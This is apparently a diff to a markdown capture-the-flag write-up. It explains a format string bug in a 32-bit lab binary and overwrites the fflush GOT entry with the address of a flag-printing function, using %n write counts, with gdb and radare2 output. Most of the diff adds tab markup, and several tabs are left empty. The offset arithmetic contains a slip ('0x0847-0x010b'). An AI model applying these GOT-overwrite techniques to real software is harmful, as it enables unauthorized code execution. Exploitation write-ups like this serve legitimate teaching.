@@ -26,6 +26,12 @@ We see that there is no canary and no PIE. This means that this code is subject 
 
 We perform our routine checks in search of anything outstanding. I chose for this binary to load it into `radare2` rather than `gdb`. `gdb` works just fine but `radare2` performs particularly well on the binary because of the number of strings and functions.
 
+{% tabs %}
+{% tab title="GDB" %}
+
+{% endtab %}
+
+{% tab title="Radare2" %}
 ```as
 [0xf7fa3850]> afl
 ...
@@ -34,9 +40,18 @@ We perform our routine checks in search of anything outstanding. I chose for thi
 0x08048724    1    214 main
 ...
 ```
+{% endtab %}
+{% endtabs %}
+
 
 We first check `flag` to make sure we don't have anything to do inside the function:
 
+{% tabs %}
+{% tab title="GDB" %}
+
+{% endtab %}
+
+{% tab title="Radare2" %}
 ```as
 [0xf7fa3850]> pdf@sym.flag__
 ┌ 25: sym.flag__ ();
@@ -51,9 +66,17 @@ We first check `flag` to make sure we don't have anything to do inside the funct
 │           0x08048722      c9             leave
 └           0x08048723      c3             ret
 ```
+{% endtab %}
+{% endtabs %}
 
 We see that this function just calls `system("cat flag.txt");` without any extra steps.
 
+{% tabs %}
+{% tab title="GDB" %}
+
+{% endtab %}
+
+{% tab title="Radare2" %}
 ```as
 [0xf7fa3850]> pdf@main
             ; DATA XREF from entry0 @ 0x8048627(w)
@@ -131,6 +154,8 @@ We see that this function just calls `system("cat flag.txt");` without any extra
 │           0x080487f3      6a01           push 1                      ; 1
 └           0x080487f5      e8f6fdffff     call sym.imp.exit           ; void exit(int status)
 ```
+{% endtab %}
+{% endtabs %}
 
 The most important thing to notice in this disassembly is that there is a format string bug at `0x080487d7`. The address we write to is directly passed as the argument to `printf`.
 
@@ -159,6 +184,8 @@ We choose `fflush` as a good candidate for overwriting because it is called righ
 
 Checking the `got` table, we can find the address of `fflush`:
 
+{% tabs %}
+{% tab title="GDB" %}
 ```as
 gef➤  got fflush
 
@@ -166,16 +193,32 @@ GOT protection: Partial RelRO | GOT functions: 11
  
 [0x804a028] fflush@GLIBC_2.0  →  0x80485c6
 ```
+{% endtab %}
+
+{% tab title="Radare2" %}
+
+{% endtab %}
+{% endtabs %}
 
 In the `got` table, `fflush` is at `0x0804a028`. We can verify this by checking the address for an instruction:
 
+{% tabs %}
+{% tab title="GDB" %}
 ```as
 gef➤  x/i 0x804a028
    0x804a028 <fflush@got.plt>:	mov    BYTE PTR [ebp-0x7a29f7fc],0x4
 ```
+{% endtab %}
+
+{% tab title="Radare2" %}
+
+{% endtab %}
+{% endtabs %}
 
 We also need the address of `flag`:
 
+{% tabs %}
+{% tab title="GDB" %}
 ```as
 gef➤  info functions flag
 All functions matching regular expression "flag":
@@ -183,6 +226,12 @@ All functions matching regular expression "flag":
 Non-debugging symbols:
 0x0804870b  flag()
 ```
+{% endtab %}
+
+{% tab title="Radare2" %}
+
+{% endtab %}
+{% endtabs %}
 
 Therefore, we need to change the value at `0x0804a028` to `0x0804870b`.
 
@@ -203,10 +252,18 @@ gdb.attach(p, gdbscript='b *(main+184)')
 
 Checking the addresses at `fflush`:
 
+{% tabs %}
+{% tab title="GDB" %}
 ```as
 gef➤  x/2wx 0x0804a028
 0x804a028 <fflush@got.plt>:	0x52005252	0xf7000000
 ```
+{% endtab %}
+
+{% tab title="Radare2" %}
+
+{% endtab %}
+{% endtabs %}
 
 We see that the current value is `0x52` at the lowest byte. Remember that we can only really _add_ to the value, meaning to get `0x0b` at that byte, we need to reach `0x10b`. This takes `0x10b-0x52=185` bytes. Therefore, we can append `%185x` into our payload so that many bytes are written first.
 
@@ -242,17 +299,33 @@ payload = addrs + formats
 Remember that `%n` prints the number of bytes written thus far. If we write spaces, we add another byte to the count. In theory, we could subtract one from the hex format specifier, but this is less confusing.
 {% endhint %}
 
+{% tabs %}
+{% tab title="GDB" %}
 ```as
 gef➤  x/2wx 0x0804a028
 0x804a028 <fflush@got.plt>:	0x0b010b0b	0xf7000001
 ```
+{% endtab %}
+
+{% tab title="Radare2" %}
+
+{% endtab %}
+{% endtabs %}
 
 The lower byte is now `0x0b` as desired. Now, let's do the second and third bytes similarly. Our current bytes are `0x010b`, and we need this to be `0x0487`. `0x0847-0x010b=892`. We can add `%892x` to the format string to write that many bytes. This changes the value at that address to:
 
+{% tabs %}
+{% tab title="GDB" %}
 ```as
 gef➤  x/2wx 0x0804a028
 0x804a028 <fflush@got.plt>: 0x8704870b	0xf7000004
 ```
+{% endtab %}
+
+{% tab title="Radare2" %}
+
+{% endtab %}
+{% endtabs %}
 
 Finally, to modify the fourth bit, we need to write `0x08` to the fourth byte, which requires `0x108-0x87=129` bytes to be written. This will spill over to the next DWORD, but that's okay because it doesn't prevent us from pulling off this exploit.
 
